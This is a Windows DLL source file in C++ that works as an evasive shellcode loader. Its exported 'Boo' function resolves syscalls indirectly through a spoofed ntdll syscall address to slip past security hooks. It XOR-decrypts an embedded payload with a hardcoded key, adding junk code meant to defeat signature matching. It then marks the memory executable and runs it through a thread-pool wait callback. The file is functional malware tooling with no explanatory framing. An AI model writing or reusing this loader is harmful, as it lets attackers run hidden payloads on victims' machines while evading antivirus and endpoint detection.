#include <windows.h>
#include "headstructs.h"
#include "payload.h"

void DecryptPayload(PBYTE data, SIZE_T len, const char* key) {
    SIZE_T kLen = strlen(key);
    PBYTE p = data;
    int junk = 0xDEADC0DE;

    for (SIZE_T i = 0; i < len; i++) {
        // Junk routine to break signature matching
        junk = (junk + i) ^ 0x55;
        if (junk == 0x12345) { // Practically unreachable
        }

        // Pointer-based XOR
        *(p + i) = *(p + i) ^ key[i % kLen];
        
        // More noise
        junk = (junk >> 1) | (junk << 31);
    }
}

PVOID CopyMemoryEx(PVOID Destination, PVOID Source, SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI Boo(void) {

    auto hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD SyscallId = 0;
    LPVOID spoofJump = ((char*)GetProcAddress(hNtdll, "NtAddBootEntry")) + 18; //Fetching the Syscall instruction address
    HANDLE c = CreateEventA(NULL, FALSE, TRUE, NULL);

    LPVOID currentVmBase = NULL;
    SIZE_T szWmResv = sizeof(buf);
    //Resolving ZwAllocateVirtualMemory
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"ZwAllocateVirtualMemory");
    setup(SyscallId, spoofJump);
    NTSTATUS status = executioner((HANDLE)-1,&currentVmBase, NULL,&szWmResv,MEM_COMMIT,PAGE_READWRITE);
    //Allocating space in memory for shellcode

    CopyMemoryEx(currentVmBase, buf, szWmResv);
    //Avoiding hooks with custom copying on current process

    const char* k = "S3cur3P4ssw0rd!2025";
    DecryptPayload((PBYTE)currentVmBase, szWmResv, k);

    //Resolving NtProtectVirtualMemory
    DWORD oldProt;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtProtectVirtualMemory");
    setup(SyscallId, spoofJump);
    status = executioner((HANDLE)-1,&currentVmBase, &szWmResv,PAGE_EXECUTE_READ,&oldProt);

    //Resolving TpAllocWait
    HANDLE hThread = NULL;
    pTpAllocWait TpAllocWait = (pTpAllocWait)GetProcAddress(hNtdll, "TpAllocWait");
    status = TpAllocWait((TP_WAIT**)&hThread, (PTP_WAIT_CALLBACK)currentVmBase, NULL, NULL);

    //Resolving TpSetWait
    pTpSetWait TpSetWait = (pTpSetWait)GetProcAddress(hNtdll, "TpSetWait");
    TpSetWait((TP_WAIT*)hThread, c, NULL);

    //Resolving NtWaitForSingleObject
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtWaitForSingleObject");
    setup(SyscallId, spoofJump);
    status = executioner(c, 0, NULL);
    return TRUE;
    }
}

